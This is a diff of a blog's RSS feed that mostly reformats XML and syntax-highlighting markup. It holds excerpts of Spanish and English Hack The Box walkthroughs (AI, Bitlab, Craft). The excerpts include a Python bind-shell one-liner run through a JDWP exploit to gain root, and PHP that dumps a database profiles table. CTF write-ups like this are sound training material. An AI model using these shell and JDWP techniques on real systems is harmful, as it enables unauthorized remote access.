@@ -1,21 +1,5 @@
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-    <channel>
-        <title>Posts on Las Aventuras de Ceso</title>
-        <link>https://ceso.github.io/es/posts/</link>
-        <description>Recent content in Posts on Las Aventuras de Ceso</description>
-        <generator>Hugo -- gohugo.io</generator>
-        <lastBuildDate>Fri, 07 Feb 2020 00:00:00 +0000</lastBuildDate>
-        <atom:link href="https://ceso.github.io/es/posts/index.xml" rel="self" type="application/rss+xml" />
-        
-        <item>
-            <title>Hack The Box - AI</title>
-            <link>https://ceso.github.io/es/posts/2020/02/hack-the-box-ai/</link>
-            <pubDate>Fri, 07 Feb 2020 00:00:00 +0000</pubDate>
-            
-            <guid>https://ceso.github.io/es/posts/2020/02/hack-the-box-ai/</guid>
-            <description>Resumen rápido Finalmente estoy posteando el walk-through de esta máquina, actualmente estoy preparando el OSCP, por lo que no tengo tanto tiempo para poder escribir en el momento. Al momento que rompí esta máquina, aún estaba documentando solamente vía screenshots, por lo que la fecha/hora entre algunas cosas puede diferir (le entré de nuevo para conseguir doc. más clara).
-Esta fue una máquina que para el punto de entrada, es necesario subir un .</description>
-            <content type="html"><![CDATA[
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Las Aventuras de Ceso</title><link>https://ceso.github.io/es/posts/</link><description>Recent content in Posts on Las Aventuras de Ceso</description><generator>Hugo -- gohugo.io</generator><lastBuildDate>Fri, 07 Feb 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://ceso.github.io/es/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>Hack The Box - AI</title><link>https://ceso.github.io/es/posts/2020/02/hack-the-box-ai/</link><pubDate>Fri, 07 Feb 2020 00:00:00 +0000</pubDate><guid>https://ceso.github.io/es/posts/2020/02/hack-the-box-ai/</guid><description>Resumen rápido Finalmente estoy posteando el walk-through de esta máquina, actualmente estoy preparando el OSCP, por lo que no tengo tanto tiempo para poder escribir en el momento. Al momento que rompí esta máquina, aún estaba documentando solamente vía screenshots, por lo que la fecha/hora entre algunas cosas puede diferir (le entré de nuevo para conseguir doc. más clara).
+Esta fue una máquina que para el punto de entrada, es necesario subir un .</description><content type="html"><![CDATA[
     <img src="/images/htb/ai/info-card.png"  class="center"  style="border-radius: 8px;"  />
 
 
@@ -207,7 +191,7 @@ tcp                 TIME-WAIT                0                     0            
 <pre><code class="language-console" data-lang="console">root       3875  5.5  5.8 3141684 118248 ?      Sl   21:02   0:05 /usr/bin/java -Djava.util.logging.config.file=/opt/apache-tomcat-9.0.27/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -agentlib:jdwp=transport=dt_socket,address=localhost:8000,server=y,suspend=n -Dignore.endorsed.dirs= -classpath /opt/apache-tomcat-9.0.27/bin/bootstrap.jar:/opt/apache-tomcat-9.0.27/bin/tomcat-juli.jar -Dcatalina.base=/opt/apache-tomcat-9.0.27 -Dcatalina.home=/opt/apache-tomcat-9.0.27 -Djava.io.tmpdir=/opt/apache-tomcat-9.0.27/temp org.apache.catalina.startup.Bootstrap start
 </code></pre><p>Con una búsqueda rápida en google, se encuentra este <a href="https://www.exploit-db.com/exploits/46501">exploit</a></p>
 <p>Entonces, para usar ese exploit se crea un <code>bind.sh</code> en <code>/tmp</code> con el siguiente código:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">python <span style="color:#f92672">-</span>c <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">,2222));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call([</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">/bin/bash</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">,</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">-i</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">])</span><span style="color:#e6db74">&#34;</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#34;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((&#39;&#39;,2222));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;])&#34;</span>
 </code></pre></div><p>Osea, se va a levantar un bind shell escuchando en el puerto 2222, se ejecuta el script:</p>
 <pre><code class="language-console" data-lang="console">alexa@AI:~$ ./jdwp-shellifier.py -t 127.0.0.1 -p 8000 --break-on 'java.lang.String.indexOf' --cmd /tmp/bind.sh 
 [+] Targeting '127.0.0.1:8000'
@@ -234,17 +218,7 @@ wc -c /root/root.txt
 </code></pre><p>Y, ahí &lsquo;ta, acceso a root y la bandera root.txt :D.</p>
 <p>Hasta el momento, esta fue una de las únicas máquinas en HTB que no me ha gustado tanto, gracias más que nada a que el punto de entrada es medio esotérico y realmente no te deja mucha enseñanza al respecto.
 Bue, próximamente estoy pensando en empezar a blogear lo que es este viaje de estar preparando el OSCP, para saber, quedar al tanto, &lsquo;ta luego!</p>
-]]></content>
-        </item>
-        
-        <item>
-            <title>Hack The Box - Bitlab</title>
-            <link>https://ceso.github.io/es/posts/2020/01/hack-the-box-bitlab/</link>
-            <pubDate>Sat, 11 Jan 2020 00:00:00 +0000</pubDate>
-            
-            <guid>https://ceso.github.io/es/posts/2020/01/hack-the-box-bitlab/</guid>
-            <description>Resumen rápido Primero que nada, tengo que dejar claro que esta máquina tiene dos formas de hacer escalamiento de privilegios: una es haciendo ingenieria inversa y la otra es aprovecharse de una mala configuración de sudo y git. Voy a describir los pasos para sudo + git, como recién estoy empezando a dar mis primeros pasos en cosas de bajo nivel. A pesar de todo, en el futuro actualizaré este post para reflejar el camino vía ingeniera inversa.</description>
-            <content type="html"><![CDATA[
+]]></content></item><item><title>Hack The Box - Bitlab</title><link>https://ceso.github.io/es/posts/2020/01/hack-the-box-bitlab/</link><pubDate>Sat, 11 Jan 2020 00:00:00 +0000</pubDate><guid>https://ceso.github.io/es/posts/2020/01/hack-the-box-bitlab/</guid><description>Resumen rápido Primero que nada, tengo que dejar claro que esta máquina tiene dos formas de hacer escalamiento de privilegios: una es haciendo ingenieria inversa y la otra es aprovecharse de una mala configuración de sudo y git. Voy a describir los pasos para sudo + git, como recién estoy empezando a dar mis primeros pasos en cosas de bajo nivel. A pesar de todo, en el futuro actualizaré este post para reflejar el camino vía ingeniera inversa.</description><content type="html"><![CDATA[
     <img src="/images/htb/bitlab/info-card.png"  class="center"  style="border-radius: 8px;"  />
 
 
@@ -322,7 +296,7 @@ después de leer un poco, nos fijamos que hace <code>index.php</code>:</p>
     <img src="/images/htb/bitlab/1.7-web_enum.png"  class="center"  style="border-radius: 8px;"  />
 
 
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 
 $input <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#34;php://input&#34;</span>);
 $payload  <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_decode</span>($input);
@@ -449,11 +423,11 @@ Ok, as I said at the begining of the post, there are 2 paths to get this box:</p
 
 
 <p>Lo abrimos y vemos que es un script para conectarse a la base de datos y hacer un dump de los perfiles:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#f92672">&lt;</span><span style="color:#f92672">?</span><span style="color:#a6e22e">php</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 <span style="color:#a6e22e">$db_connection</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_connect</span>(<span style="color:#e6db74">&#34;host=localhost dbname=profiles user=profiles password=profiles&#34;</span>);
 <span style="color:#a6e22e">$result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_query</span>(<span style="color:#a6e22e">$db_connection</span>, <span style="color:#e6db74">&#34;SELECT * FROM profiles&#34;</span>);
 </code></pre></div><p>Entonces, desde adentro del proyecto Profile agregamos un archivo con ese código, pero también creamos un array con <code>pg_fetch_all($result)</code> para guardarnos todos los perfiles que se les hace un dump, con eso tenemos este resultado:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#f92672">&lt;</span><span style="color:#f92672">?</span><span style="color:#a6e22e">php</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 <span style="color:#a6e22e">$db_connection</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_connect</span>(<span style="color:#e6db74">&#34;host=localhost dbname=profiles user=profiles password=profiles&#34;</span>);
 <span style="color:#a6e22e">$result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_query</span>(<span style="color:#a6e22e">$db_connection</span>, <span style="color:#e6db74">&#34;SELECT * FROM profiles&#34;</span>);
 <span style="color:#a6e22e">$arr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_fetch_all</span>(<span style="color:#a6e22e">$result</span>);
@@ -482,17 +456,7 @@ clave@bitlab:~$ wc -c user.txt
 </code></pre><p>Obtenemos el shell del usuario, y después de listar archivos en su home, vemos un archivo interesante que se llama <code>RemoteConnection.exe</code>, desde ahí vamos a necesitar descargarlo y empezar a ensuciarnos un poco las manos con algun debugger y hacer ingenieria inversa para ver que esconde adentro, perooo como dije antes, lo voy a actualizar en el momento en que aprenda a hacerlo :P.</p>
 <p>Bueno, entonces sabemos que esta máquina tiene dos formas de conseguir root. Me encantó esta máquina, y estoy esperando a tirarme al agua con ella de nuevo cuando tenga un poquito más de idea de ing. inversa.</p>
 <p>Ta luego, hasta el próximo paso a paso!</p>
-]]></content>
-        </item>
-        
-        <item>
-            <title>Hack The Box - Craft</title>
-            <link>https://ceso.github.io/es/posts/2020/01/hack-the-box-craft/</link>
-            <pubDate>Sat, 04 Jan 2020 00:00:00 +0000</pubDate>
-            
-            <guid>https://ceso.github.io/es/posts/2020/01/hack-the-box-craft/</guid>
-            <description>Quick Summary So!! Today was just retired Craft from Hack the box, this was a really fun box to do, and also I felt pretty well doing it, because even if I needed some nudges, it was actually the first box I got to the foothold without hints (elsen if I needed some guidance with python, thanks a lot @Frundrod!!), and afterward to get user I was a bit lost and also needed some hints (was not realizing something I have literally in my nose, thankss a lot @Fugl!</description>
-            <content type="html"><![CDATA[
+]]></content></item><item><title>Hack The Box - Craft</title><link>https://ceso.github.io/es/posts/2020/01/hack-the-box-craft/</link><pubDate>Sat, 04 Jan 2020 00:00:00 +0000</pubDate><guid>https://ceso.github.io/es/posts/2020/01/hack-the-box-craft/</guid><description>Quick Summary So!! Today was just retired Craft from Hack the box, this was a really fun box to do, and also I felt pretty well doing it, because even if I needed some nudges, it was actually the first box I got to the foothold without hints (elsen if I needed some guidance with python, thanks a lot @Frundrod!!), and afterward to get user I was a bit lost and also needed some hints (was not realizing something I have literally in my nose, thankss a lot @Fugl!</description><content type="html"><![CDATA[
     <img src="/images/htb/craft/info-card.png"  class="center"  style="border-radius: 8px;"  />
 
 
@@ -937,8 +901,4 @@ root@craft:~#
 </code></pre><p>And we own root!!
 Again I enjoyed quite a lot doing this box a few hours it was going to be retired, and again thanks @Frundrod and <a href="https://www.hackthebox.eu/profile/103596">@Fugl</a> for pointing me in the right direction.</p>
 <p>Thanks a lot for reading, and until the next write-up.</p>
-]]></content>
-        </item>
-        
-    </channel>
-</rss>
+]]></content></item></channel></rss>
